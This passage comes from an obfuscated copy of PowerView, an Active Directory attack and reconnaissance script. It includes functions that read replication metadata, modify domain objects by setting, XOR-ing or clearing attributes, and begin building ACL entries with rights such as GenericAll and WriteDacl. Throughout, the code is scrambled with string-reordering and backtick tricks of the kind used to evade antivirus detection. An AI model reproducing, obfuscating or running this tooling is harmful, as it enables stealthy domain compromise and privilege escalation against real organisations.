                        ${oU`TP`Ut} = &("{0}{1}{3}{2}" -f'N','ew','t','-Objec') ("{1}{0}" -f'ect','PSObj')
                        ${O`U`TpUT} | &("{2}{1}{3}{0}" -f'er','e','Add-M','mb') ("{0}{2}{1}"-f'Not','rty','ePrope') ("{0}{2}{1}"-f 'Obje','DN','ct') ${O`BJEC`Tdn}
                        ${O`U`Tput} | &("{0}{2}{1}"-f'Ad','Member','d-') ("{2}{1}{3}{0}"-f 'y','er','NoteProp','t') ("{2}{1}{0}{3}" -f'ibuteNa','ttr','A','me') ${t`eM`PobjeCT}."psz`AttRiBu`TE`N`AmE"
                        ${ou`TP`UT} | &("{0}{1}{2}" -f'Add-Me','m','ber') ("{0}{1}{2}"-f'Not','e','Property') ("{1}{2}{4}{3}{0}" -f 'gChange','Last','Or','atin','igin') ${T`e`MPO`BJeCT}."ftIME`lastORi`Gin`AtING`CH`An`GE"
                        ${o`Ut`puT} | &("{1}{2}{0}{3}"-f 'mb','Ad','d-Me','er') ("{0}{1}{3}{2}" -f 'N','ot','erty','eProp') ("{1}{0}{2}"-f'rs','Ve','ion') ${T`e`MpOb`jeCt}."DWveRs`Ion"
                        ${o`UTpUt} | &("{0}{1}{2}"-f'Add','-Mem','ber') ("{2}{0}{1}"-f 'P','roperty','Note') ("{1}{5}{4}{3}{2}{0}" -f'tingDsaDN','L','a','rigin','O','ast') ${t`E`M`PoBJECT}."psz`lAstOrI`gIN`ATi`NgdSAdN"
                        ${OUt`pUT}."P`sObJe`cT"."TyPEn`A`M`Es".("{1}{0}" -f'rt','Inse').Invoke(0, ("{5}{3}{1}{2}{4}{8}{6}{0}{7}" -f'tor','ew','.ADObjectAtt','i','ri','PowerV','teHis','y','bu'))
                        ${o`UT`PuT}
                    }
                }
                else {
                    &("{1}{3}{2}{0}"-f 'erbose','W','te-V','ri') ('['+'G'+'e'+'t'+'-Do'+'main'+'Obje'+'ct'+'At'+'tributeHistory] '+'Er'+'ro'+'r '+'retriev'+'i'+'ng '+('x'+'i'+'Xm'+'sds-r'+'eplatt'+'ribut'+'emet'+'a'+'dat'+'axiX ')."reP`LACe"(([chaR]120+[chaR]105+[chaR]88),[STRiNG][chaR]39)+'f'+'or '+"'$ObjectDN'")
                }
            }
        }
    }
}


function GEt-`dOma`InobJeCT`LInKe`DaTtRi`But`EH`is`ToRY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{7}{4}{6}{1}{0}{5}{3}"-f 'eThanAs','Mor','PS','nments','ared','sig','Vars','UseDecl'}, '')]
    [OutputType({"{5}{4}{6}{3}{7}{2}{1}{0}" -f'History','bute','ttri','ctLink','owe','P','rView.ADObje','edA'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTIon = 0, VAlUEFroMPiPELINe = ${tr`Ue}, valUEFROMPipELiNeBYProPERtYnAMe = ${Tr`UE})]
        [Alias({"{4}{1}{0}{2}{3}"-f 'inguis','t','he','dName','Dis'}, {"{0}{2}{1}"-f'SamA','ountName','cc'}, {"{0}{1}" -f 'Na','me'}, {"{0}{3}{2}{4}{1}" -f'Mem','e','uishedNa','berDisting','m'}, {"{2}{1}{0}" -f'ame','rN','Membe'})]
        [String[]]
        ${Ide`Nti`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oma`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Fi','lter'})]
        [String]
        ${l`D`A`pfilter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`op`er`TIes},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'ADS','th','Pa'})]
        [String]
        ${SEa`R`chBASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}"-f't','Con','roller','Domain'})]
        [String]
        ${S`e`Rver},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{1}" -f 'OneLeve','l'}, {"{1}{0}"-f'e','Subtre'})]
        [String]
        ${sEAr`Ch`ScOPe} = ("{0}{1}"-f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`Ult`pAG`EsizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`Rv`eRtiMEli`MiT},

        [Switch]
        ${t`oMb`sTO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RE`dEnti`Al} =   (CHILdiTem ("{0}{1}{2}{3}" -f 'V','Ar','IAB','Le:QfN') )."v`AluE"::"E`MpTy",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${S`EARcHerARG`U`mE`NtS} = @{
            ("{1}{0}{2}" -f'p','Pro','erties')    =   ("{0}{2}{4}{3}{1}"-f 'm','ata','sds-replvaluem','tad','e'),("{0}{1}{3}{4}{2}" -f 'dist','inguish','e','e','dnam')
            'Raw'           =   ${t`Rue}
        }
        if (${ps`B`oUNDPArAm`eTe`Rs}[("{1}{0}" -f'n','Domai')]) { ${S`EAR`CHerARgU`mEnTs}[("{0}{1}" -f'Domai','n')] = ${DOMa`IN} }
        if (${PsBOU`NDPaRAM`e`T`eRS}[("{2}{1}{0}" -f 'r','lte','LDAPFi')]) { ${sEARcH`eRaRG`UmEN`TS}[("{0}{1}{2}" -f'LD','APFi','lter')] = ${ldAP`F`ILTER} }
        if (${PSbounD`PA`RamE`TERS}[("{2}{0}{1}" -f 'chBas','e','Sear')]) { ${S`EaRcheraRG`UmeN`Ts}[("{2}{1}{0}"-f'e','archBas','Se')] = ${S`eARcH`B`ASe} }
        if (${PSB`OUn`DPa`RAMeT`ers}[("{1}{0}" -f'rver','Se')]) { ${s`EaR`CH`e`Rar`gUmeNTS}[("{0}{2}{1}" -f'S','r','erve')] = ${S`eRvEr} }
        if (${pSbOuN`d`p`ARamE`TErS}[("{0}{1}{3}{2}"-f 'Sea','rchS','ope','c')]) { ${Se`A`RCh`erarguM`ENtS}[("{1}{0}{2}"-f 'earch','S','Scope')] = ${s`eaR`CHSCOpE} }
        if (${pSB`O`UNdpARA`ME`TErS}[("{1}{2}{0}" -f'e','Resu','ltPageSiz')]) { ${SEA`Rc`He`RAR`g`UMENtS}[("{3}{0}{1}{2}" -f 'es','ultPageS','ize','R')] = ${r`EsUl`T`PagEsIZE} }
        if (${P`sBOUN`D`P`ArAM`ETERs}[("{3}{2}{0}{1}"-f'i','t','eLim','ServerTim')]) { ${SEARCh`eR`Ar`GuMe`NTS}[("{0}{3}{1}{2}"-f 'ServerTi','i','t','meLim')] = ${serV`ert`IMeli`miT} }
        if (${PS`B`o`Und`ParAMeTeRS}[("{0}{2}{1}"-f'To','e','mbston')]) { ${s`EaR`CheRa`RgUmeNTs}[("{0}{1}{2}"-f'Tom','bsto','ne')] = ${TOm`BStO`NE} }
        if (${P`sBOU`N`DPARAmETerS}[("{2}{1}{0}"-f'al','nti','Crede')]) { ${SeAR`cHEr`ARG`U`mENtS}[("{0}{3}{2}{1}"-f 'C','al','ti','reden')] = ${CREd`EnTi`Al} }

        if (${ps`BO`UNdPaRAM`eTERs}[("{1}{2}{0}"-f's','Prope','rtie')]) {
            ${PR`oP`Er`TyfiLtEr} = ${PsbO`UNd`pARAmEt`e`RS}[("{1}{2}{3}{0}" -f 'ties','Pr','o','per')] -Join '|'
        }
        else {
            ${Pr`o`Pe`RtyfilT`er} = ''
        }
    }

    PROCESS {
        if (${ps`B`OuNDPaRa`METERs}[("{1}{2}{0}" -f 'ty','Id','enti')]) { ${s`e`A`RcHerArguMEnTS}[("{0}{2}{1}"-f'I','tity','den')] = ${ide`Nt`iTY} }

        &("{2}{4}{1}{3}{0}"-f 'inObject','D','G','oma','et-') @SearcherArguments | &("{3}{1}{2}{4}{0}"-f 't','Ob','j','ForEach-','ec') {
            ${ObJE`C`TDN} = ${_}."pr`OPER`TieS"[("{0}{3}{1}{2}"-f 'di','u','ishedname','sting')][0]
            ForEach(${X`mL`NODe} in ${_}."PRO`perT`iEs"[("{1}{0}{5}{2}{4}{3}"-f 'sd','m','-','metadata','replvalue','s')]) {
                ${T`eMpo`BJe`cT} = [xml]${X`Ml`NoDE} | &("{0}{2}{1}{3}"-f'Sel','t','ec','-Object') -ExpandProperty ("{1}{5}{4}{0}{2}{3}" -f'E','DS_REP','_META_D','ATA','_VALU','L') -ErrorAction ("{0}{1}{2}{3}" -f'Sil','en','tly','Continue')
                if (${tEmpo`B`j`ECT}) {
                    if (${t`eMpob`j`ECt}."psz`AtTRI`BUtEn`A`mE" -Match ${PR`op`ErT`YfilTEr}) {
                        ${Ou`Tput} = &("{0}{2}{1}"-f'N','bject','ew-O') ("{0}{2}{1}" -f 'PSO','ject','b')
                        ${O`Ut`pUt} | &("{1}{2}{0}" -f'ber','Add-','Mem') ("{0}{1}{2}" -f 'Note','Prope','rty') ("{0}{2}{1}" -f 'O','ctDN','bje') ${obJ`eCt`DN}
                        ${o`UtP`UT} | &("{3}{1}{2}{0}" -f 'ber','d','d-Mem','A') ("{2}{0}{1}"-f 'oteProp','erty','N') ("{2}{1}{3}{0}"-f 'ame','ttr','A','ibuteN') ${TEm`PoBJ`ECT}."p`SZAttr`I`ButeNAmE"
                        ${o`UT`pUT} | &("{1}{0}{2}" -f'e','Add-M','mber') ("{3}{0}{2}{1}"-f 'otePr','erty','op','N') ("{3}{1}{2}{0}"-f'Value','tri','bute','At') ${TeMpo`BJ`EcT}."ps`z`o`BjectDN"
                        ${Out`p`Ut} | &("{0}{1}{2}"-f'Add-Mem','b','er') ("{0}{2}{1}{3}"-f 'N','P','ote','roperty') ("{0}{1}{2}"-f 'Ti','meCreate','d') ${tem`p`ObjeCT}."F`T`iMEcrEa`TeD"
                        ${o`U`TpuT} | &("{2}{0}{1}" -f'm','ber','Add-Me') ("{1}{3}{0}{2}"-f't','N','eProperty','o') ("{2}{0}{1}"-f'ime','Deleted','T') ${T`empOBJ`E`Ct}."FtI`meDELe`T`ED"
                        ${o`UT`pUt} | &("{2}{1}{0}" -f'r','d-Membe','Ad') ("{1}{2}{0}" -f'perty','Note','Pro') ("{4}{0}{3}{2}{5}{1}" -f'a','ingChange','na','stOrigi','L','t') ${t`EmpobJ`ecT}."f`TIMeL`AS`To`RI`gInAtIn`GCH`A`NGe"
                        ${oU`TpUt} | &("{2}{1}{0}" -f 'r','be','Add-Mem') ("{1}{0}{2}{3}"-f'ePr','Not','oper','ty') ("{0}{1}" -f 'Versio','n') ${tEmp`Ob`JEcT}."Dw`VErs`iOn"
                        ${Ou`T`PuT} | &("{0}{1}{2}" -f 'Add','-M','ember') ("{0}{2}{1}"-f'NotePro','y','pert') ("{0}{1}{3}{2}" -f 'L','ast','riginatingDsaDN','O') ${TEmPO`B`JeCt}."p`S`zLAsTO`RiG`InatINgD`s`Adn"
                        ${OU`TP`UT}."psObJ`eCt"."ty`PEn`A`MeS".("{0}{1}{2}"-f 'I','ns','ert').Invoke(0, ("{11}{5}{0}{3}{4}{10}{9}{1}{2}{6}{7}{8}"-f'V','ked','Attrib','i','e','ower','uteHist','o','ry','Lin','w.ADObject','P'))
                        ${oUT`p`UT}
                    }
                }
                else {
                    &("{1}{0}{3}{4}{2}"-f 'ite-Ve','Wr','e','rbo','s') ('[G'+'et'+'-Do'+'m'+'ai'+'n'+'ObjectLinke'+'dAtt'+'ributeHi'+'stor'+'y'+'] '+'Error'+' '+'retri'+'e'+'ving '+(('Z'+'I8ms'+'ds-'+'r'+'ep'+'lvaluemet'+'ad'+'at'+'aZI'+'8 ')  -repLACe'ZI8',[ChAr]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function sEt`-`doMAinO`BJE`Ct {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{6}{3}{4}{5}{8}{0}{7}" -f'ion','PSUseShouldP','rocessForS','Changi','ngFu','nc','tate','s','t'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{1}{0}{3}" -f'Proce','d','PSShou','ss','l'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTIoN = 0, maNDaToRy = ${T`RUe}, VaLuEfROmPIpelINE = ${T`Rue}, valUeFrOmpIPELinEbYPropeRtYnaME = ${T`RuE})]
        [Alias({"{1}{2}{0}{3}" -f 'guished','Di','stin','Name'}, {"{1}{0}{3}{2}"-f 'AccountN','Sam','me','a'}, {"{1}{0}"-f'e','Nam'})]
        [String[]]
        ${ID`eNTiTy},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Re','ce','pla'})]
        [Hashtable]
        ${S`et},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${x`oR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cLE`Ar},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'er','Fil','t'})]
        [String]
        ${lDAP`FILT`ER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSP','ath'})]
        [String]
        ${SEaR`c`h`BASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f 'ainCo','troller','Dom','n'})]
        [String]
        ${se`Rv`er},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{1}{0}{2}" -f'eve','OneL','l'}, {"{0}{1}"-f 'Subtr','ee'})]
        [String]
        ${SE`A`RChsc`Ope} = ("{0}{1}" -f'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESu`lTpagES`i`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serveRTIm`e`l`imit},

        [Switch]
        ${t`oMb`sToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREd`ENt`IAL} =   ${q`FN}::"E`MPTy"
    )

    BEGIN {
        ${sEARc`HER`ARGu`M`eNTS} = @{'Raw' = ${T`Rue}}
        if (${Psb`oun`dPa`R`AmETErS}[("{0}{1}{2}"-f'Do','m','ain')]) { ${sea`Rche`RAR`GUMeNTS}[("{1}{0}"-f 'main','Do')] = ${d`OmAin} }
        if (${ps`BoUNDPAr`AMe`TeRS}[("{0}{2}{1}"-f'L','PFilter','DA')]) { ${sEARCH`erAr`GUM`e`NTs}[("{0}{2}{3}{1}"-f 'L','er','DAPF','ilt')] = ${LDAp`FIl`T`eR} }
        if (${PSbO`Un`dPaRAm`eTers}[("{1}{2}{0}" -f 'Base','Sea','rch')]) { ${S`EAr`C`hera`Rgu`mENTS}[("{1}{0}{2}"-f 'chBa','Sear','se')] = ${SE`ARC`hBA`sE} }
        if (${p`sbOun`Dpa`RaMEteRS}[("{1}{0}{2}" -f'e','S','rver')]) { ${S`eA`RCHErARGUm`Ents}[("{2}{1}{0}" -f 'ver','r','Se')] = ${SE`Rver} }
        if (${Ps`BO`UnD`pA`RAm`EtErS}[("{2}{3}{0}{1}"-f 'chSc','ope','Se','ar')]) { ${Se`Arch`E`RARgumENtS}[("{2}{3}{0}{1}" -f 'S','cope','Sea','rch')] = ${SE`AR`ChSC`OpE} }
        if (${pSBOuNdP`ArAm`et`eRs}[("{0}{3}{2}{1}"-f 'Re','PageSize','lt','su')]) { ${S`E`ARCHer`A`R`GumeNTs}[("{0}{3}{2}{1}"-f'Re','eSize','tPag','sul')] = ${re`S`U`LTpagE`SiZe} }
        if (${Ps`BoUN`d`paRAmE`TErS}[("{1}{4}{3}{0}{2}"-f 'meL','S','imit','verTi','er')]) { ${SEAr`cHe`R`ARGU`mENtS}[("{2}{3}{0}{1}"-f 'mi','t','S','erverTimeLi')] = ${se`R`VERtIMeLi`mIT} }
        if (${PS`Bo`U`NdpaRAM`EtErS}[("{1}{2}{0}" -f 'ne','To','mbsto')]) { ${S`eaRCHeRa`R`G`UMEnTs}[("{0}{1}"-f'Tombsto','ne')] = ${TO`mb`STonE} }
        if (${p`Sbou`NDp`ArAMeT`e`RS}[("{1}{2}{0}"-f'al','C','redenti')]) { ${s`eARCh`ErARgU`meNts}[("{2}{1}{0}"-f'tial','en','Cred')] = ${Cr`eDE`NtIaL} }
    }

    PROCESS {
        if (${p`sb`Ou`NdpaRamet`eRs}[("{2}{0}{1}" -f'ti','ty','Iden')]) { ${SEArCH`ERaR`gu`M`eNtS}[("{1}{0}{2}" -f'ntit','Ide','y')] = ${i`dEnt`iTy} }

        
        ${RaWo`Bj`eCT} = &("{1}{0}{3}{2}{4}"-f '-D','Get','in','oma','Object') @SearcherArguments

        ForEach (${o`BjEct} in ${ra`w`O`BJECT}) {

            ${E`N`TrY} = ${r`A`wOBJeCt}.("{3}{2}{1}{0}"-f 'ntry','E','ectory','GetDir').Invoke()

            if(${p`Sb`ounD`pARA`me`TErs}['Set']) {
                try {
                    ${PsBo`UndP`ARa`Meters}['Set'].("{2}{1}{0}{3}"-f'mera','nu','GetE','tor').Invoke() | &("{2}{3}{1}{0}"-f'ct','Obje','Fo','rEach-') {
                        &("{2}{1}{0}" -f 'e','erbos','Write-V') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        ${eN`Try}.("{0}{1}" -f'p','ut').Invoke(${_}."n`Ame", ${_}."vAl`Ue")
                    }
                    ${EN`T`Ry}.("{0}{3}{1}{2}"-f'c','itchan','ges','omm').Invoke()
                }
                catch {
                    &("{2}{0}{1}" -f 'n','g','Write-Warni') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${ps`Bou`NdP`ArA`mEt`eRs}['XOR']) {
                try {
                    ${P`s`B`ou`NDParAm`ETeRs}['XOR'].("{0}{1}{2}"-f'GetE','nu','merator').Invoke() | &("{2}{1}{0}"-f 't','h-Objec','ForEac') {
                        ${proP`ERtyn`AMe} = ${_}."na`ME"
                        ${PRopEr`TyxO`RV`ALue} = ${_}."v`ALUE"
                        &("{4}{3}{1}{2}{0}" -f'bose','e-','Ver','rit','W') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        ${tYP`e`NAmE} = ${en`T`RY}.${PR`OPerT`YNaMe}[0].("{0}{1}" -f'GetTy','pe').Invoke()."N`AME"

                        
                        ${PRoPE`Rt`YV`ALue} = $(${E`Nt`RY}.${pRoPeR`T`YNaME}) -bxor ${pR`O`PE`RtY`XoR`VAlue}
                        ${e`NT`RY}.${pRope`Rt`yNaMe} = ${pR`o`per`Ty`VALuE} -as ${t`yPE`Name}
                    }
                    ${eN`TRy}.("{2}{0}{1}"-f'mmitcha','nges','co').Invoke()
                }
                catch {
                    &("{2}{3}{1}{0}"-f 'ing','rn','Write-W','a') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${psB`ouNdPa`Ra`metErs}[("{0}{1}"-f'C','lear')]) {
                try {
                    ${psbOU`Nd`PaRA`Met`E`Rs}[("{1}{0}" -f 'lear','C')] | &("{0}{1}{3}{2}"-f'ForEach-O','b','ct','je') {
                        ${Pr`opER`TynAME} = ${_}
                        &("{2}{1}{3}{0}"-f 'se','te-Ve','Wri','rbo') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        ${E`Nt`Ry}.${pR`o`PER`TynAME}.("{1}{0}"-f'lear','c').Invoke()
                    }
                    ${EN`T`RY}.("{4}{3}{2}{0}{1}" -f'n','ges','a','mmitch','co').Invoke()
                }
                catch {
                    &("{1}{0}{2}" -f'-War','Write','ning') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function cOn`VE`RtFrOM-lDaploG`O`N`hO`URS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{5}{3}{4}{0}{1}"-f'gnmen','ts','PSUseDe','redVars','MoreThanAssi','cla'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}"-f'cess','P','SShouldPr','o'}, '')]
    [OutputType({"{2}{1}{3}{0}"-f'LogonHours','werV','Po','iew.'})]
    [CmdletBinding()]
    Param (
        [Parameter( VaLuEfRoMpIpelInE = ${Tr`Ue}, ValuefROmPipELinebYPRoPERtyNAmE = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${l`Ogon`HOur`SARrAY}
    )

    Begin {
        if(${LO`go`Nh`O`URsArr`Ay}."co`Unt" -ne 21) {
            throw ("{3}{5}{6}{4}{2}{7}{1}{0}{8}" -f 'ec','rr','i','L','oursArray is the ','og','onH','nco','t length')
        }

        function c`Onv`eRtTo-l`og`on`Ho`URsARRay {
            Param (
                [int[]]
                ${h`o`URsarR}
            )

            ${loGoN`HO`U`Rs} = &("{0}{1}{2}"-f 'New','-Ob','ject') ("{0}{1}"-f'bo','ol[]') 24
            for(${I}=0; ${I} -lt 3; ${I}++) {
                ${b`Yte} = ${HO`UrS`ARR}[${I}]
                ${of`FS`et} = ${I} * 8
                ${S`Tr} =  ( GET-VaRIAbLe ('l'+'8f') -va )::("{2}{1}{0}"-f 'ring','St','To').Invoke(${By`TE},2).("{0}{1}" -f 'Pad','Left').Invoke(8,'0')

                ${Log`ONhOU`RS}[${o`F`FSeT}+0] = [bool]   ( gI  ('v'+'ARiaBle:L8'+'F') )."Va`lue"::"to`iNt32"([string]${S`Tr}[7])
                ${LOG`ON`Ho`URS}[${O`FF`sEt}+1] = [bool]  ( ChIldiTem ("va"+"r"+"iAbLe:L8f") )."V`Alue"::"t`OInt32"([string]${S`TR}[6])
                ${L`o`gONho`Urs}[${o`FF`SEt}+2] = [bool]  ( VArIaBLe  ("{1}{0}" -f 'F','L8') )."vA`LUE"::"T`oiNt32"([string]${S`TR}[5])
                ${LOGOn`HOU`RS}[${OF`FS`ET}+3] = [bool]  (LS ("{0}{2}{1}{3}" -f'varI','ble:L','a','8F')  )."VA`LuE"::"ToiNT`32"([string]${S`Tr}[4])
                ${l`ogon`hourS}[${offs`Et}+4] = [bool]   ( GcI  ('V'+'A'+'RIaBl'+'e:l8F')  )."V`ALuE"::"tO`InT32"([string]${s`Tr}[3])
                ${l`O`GO`NHouRs}[${OF`FS`ET}+5] = [bool]   (  VARIaBlE ('L'+'8F')  -vALuEOn )::"tOI`Nt32"([string]${s`Tr}[2])
                ${LOgO`NHO`URs}[${O`FfS`Et}+6] = [bool]  (dIR  ("va"+"RIAbl"+"E:"+"L8f"))."vAl`Ue"::"To`Int32"([string]${s`Tr}[1])
                ${loG`ONHO`URs}[${ofFS`et}+7] = [bool]  ( ls ('v'+'A'+'riAB'+'le:l8f')  )."VA`lUE"::"t`OINT32"([string]${s`TR}[0])
            }

            ${LOgo`N`hOURs}
        }
    }

    Process {
        ${Out`put} = @{
            ("{1}{0}"-f'y','Sunda') = &("{4}{0}{3}{2}{6}{5}{1}" -f'er','ray','go','tTo-Lo','Conv','Ar','nHours') -HoursArr ${LoGonHO`U`R`sARrAy}[0..2]
            ("{1}{0}"-f'nday','Mo') = &("{1}{5}{0}{2}{3}{4}"-f'e','Con','rt','To-LogonHours','Array','v') -HoursArr ${Log`oNhoUrSA`RR`AY}[3..5]
            ("{0}{1}"-f 'Tu','esday') = &("{3}{6}{1}{2}{5}{4}{0}" -f'rray','rt','To-','C','nHoursA','Logo','onve') -HoursArr ${lOg`oN`hoURsaR`R`AY}[6..8]
            ("{1}{2}{0}"-f'ay','Wednes','d') = &("{7}{2}{0}{4}{5}{1}{3}{6}"-f 'rtTo-Lo','r','onve','sArr','gonHo','u','ay','C') -HoursArr ${Lo`GO`NH`ouR`sAr`RAY}[9..11]
            ("{1}{0}"-f's','Thur') = &("{1}{3}{2}{5}{4}{0}" -f'gonHoursArray','C','nve','o','tTo-Lo','r') -HoursArr ${lo`g`On`hourS`ARR`Ay}[12..14]
            ("{1}{0}"-f'ay','Frid') = &("{1}{3}{6}{4}{0}{5}{2}"-f 'Ho','ConvertT','Array','o-','n','urs','Logo') -HoursArr ${L`O`gO`N`hoursArRAY}[15..17]
            ("{2}{1}{0}" -f 'urday','t','Sa') = &("{4}{1}{3}{0}{5}{2}" -f 'onHour','nve','ray','rtTo-Log','Co','sAr') -HoursArr ${LO`g`ONH`OU`RsaRRAy}[18..20]
        }

        ${ou`Tp`UT} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{0}{2}" -f 'SObje','P','ct') -Property ${o`U`TpuT}
        ${O`U`TpUt}."pSobjE`cT"."tyP`enaM`es".("{1}{2}{0}"-f 't','In','ser').Invoke(0, ("{5}{4}{1}{2}{3}{0}" -f 'nHours','Vie','w','.Logo','wer','Po'))
        ${O`Utp`UT}
    }
}


function N`eW`-ADoBJE`cTA`ccEsSCONtro`LEN`TRY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{12}{10}{8}{7}{5}{11}{9}{4}{6}{3}{2}{1}{0}" -f'ns','o','ncti','Fu','ateChan','ProcessF','ging','uld','ho','rSt','seS','o','PSU'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}{4}" -f'PSS','d','houl','Proc','ess'}, '')]
    [OutputType({"{9}{6}{5}{11}{10}{0}{3}{7}{8}{4}{2}{1}"-f'A','onRule','i','ut','izat','ity.Access','tem.Secur','h','or','Sys','trol.','Con'})]
    [CmdletBinding()]
    Param (
        [Parameter(PosITIon = 0, vAluefroMPIpELinE = ${t`RuE}, vALuEFromPIpeLineByPRoPeRTyname = ${tr`Ue}, mAnDatory = ${T`RUE})]
        [Alias({"{1}{2}{3}{0}"-f 'e','D','istinguish','edNam'}, {"{0}{1}{2}" -f'SamAccoun','t','Name'}, {"{1}{0}"-f 'e','Nam'})]
        [String]
        ${pRIN`c`Ip`ALiD`ENTI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${prInC`IpAlDo`M`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{4}{1}{2}"-f 'om','Control','ler','D','ain'})]
        [String]
        ${S`erV`er},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{2}{0}{1}" -f 'neLe','vel','O'}, {"{2}{1}{0}" -f 'ree','bt','Su'})]
        [String]
        ${s`E`ARc`HsCOPE} = ("{0}{1}{2}"-f 'Su','btre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`ESult`Pa`gesi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`er`TImE`L`imIT},

        [Switch]
        ${t`oM`BStO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EDEntI`AL} =   ( VariaBlE  ("qf"+"n") -vAlu )::"EMp`Ty",

        [Parameter(MaNDAtOrY = ${TR`UE})]
        [ValidateSet({"{4}{5}{0}{2}{1}{3}"-f'sSyst','curi','emSe','ty','Acce','s'}, {"{0}{2}{1}" -f'C','teChild','rea'},{"{1}{2}{0}" -f 'te','Del','e'},{"{2}{1}{0}" -f 'hild','leteC','De'},{"{0}{2}{1}" -f'De','teTree','le'},{"{0}{2}{3}{1}"-f'E','ht','xte','ndedRig'},{"{0}{2}{1}" -f 'G','ricAll','ene'},{"{1}{2}{0}" -f'cute','Gener','icExe'},{"{3}{0}{2}{1}"-f'ricR','d','ea','Gene'},{"{1}{0}{3}{2}"-f'eneric','G','e','Writ'},{"{0}{2}{3}{1}"-f'L','ildren','i','stCh'},{"{1}{2}{0}" -f'ct','Li','stObje'},{"{0}{2}{1}"-f'ReadC','trol','on'},{"{3}{0}{2}{1}"-f 'adPrope','y','rt','Re'},{"{0}{1}" -f 'Sel','f'},{"{1}{2}{0}" -f'ze','Sy','nchroni'},{"{2}{1}{0}"-f'l','ac','WriteD'},{"{2}{3}{1}{0}" -f 'eOwner','it','W','r'},{"{3}{1}{2}{0}"-f'roperty','te','P','Wri'})]
        ${R`IG`HT},

        [Parameter(MaNdAtOry = ${tR`UE}, paRaMeTErsETnamE="a`Cc`esSrUleT`YPe")]
        [ValidateSet({"{1}{0}"-f 'w','Allo'}, {"{0}{1}" -f'De','ny'})]
        [String[]]
        ${acc`Es`SC`ON`TrO`LtYPe},

        [Parameter(mandAtory = ${t`RuE}, ParAMETERSEtNAme="AuDI`TR`UlEtYPE")]
        [ValidateSet({"{1}{0}{2}"-f 'u','S','ccess'}, {"{0}{1}" -f 'Fai','lure'})]
        [String]
        ${AU`DItfL`AG},

        [Parameter(mANdatoRY = ${F`ALSE}, PaRaMETERSEtnAME="ac`CeSsr`UlE`TYpE")]
        [Parameter(MAnDatOry = ${Fa`lSe}, parAMEtERSETnAmE="aUDI`TruLET`ypE")]
        [Parameter(ManDatoRy = ${F`ALse}, parAmeTErseTnAme="O`Bje`C`Tguidlo`OKuP")]
        [Guid]
        ${O`BJect`TYpE},

        [ValidateSet('All', {"{1}{0}{2}"-f 'ldre','Chi','n'},{"{0}{2}{1}"-f'Descend','ts','en'},{"{0}{1}" -f'N','one'},{"{1}{0}{3}{2}"-f 'fAnd','Sel','dren','Chil'})]
        [String]
        ${INhERitaNc`E`T`YpE},

        [Guid]
        ${in`hEr`I`TE`d`ObJecttYPE}
    )

    Begin {
        if (${princ`ipaLIdEnt`I`Ty} -notmatch ("{1}{0}"-f '-.*','^S-1')) {
            ${priNcIpa`lS`EArCh`eR`AR`GU`mENTS} = @{
                ("{0}{2}{1}"-f 'Ide','ity','nt') = ${PrIn`CiPAl`iDEN`TI`Ty}
                ("{0}{1}{2}" -f'Proper','ti','es') = ("{3}{4}{2}{1}{5}{0}" -f'id','e,objec','dnam','distinguish','e','ts')
            }
